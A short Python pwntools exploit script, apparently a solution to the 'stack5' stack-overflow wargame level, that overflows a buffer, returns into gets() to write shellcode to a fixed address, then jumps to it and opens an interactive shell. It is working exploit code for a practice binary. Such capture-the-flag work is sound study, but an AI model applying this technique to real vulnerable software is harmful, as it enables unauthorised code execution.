from pwn import *
r = process("stack5")
raw_input("debug?")

def shell():
	shellcode = asm(shellcraft.sh())
	gets_plt = 0x80482e8
	shell_addr = 0x8049000
	payload = "a"*(0x58 - 0x10 + 4)
	payload += p32(gets_plt) #ret add 1
	payload += p32(shell_addr) #ret add 2
	payload += p32(shell_addr) # arg
	
	r.sendline(payload)
	r.sendline(shellcode)
	
	r.interactive()

shell()
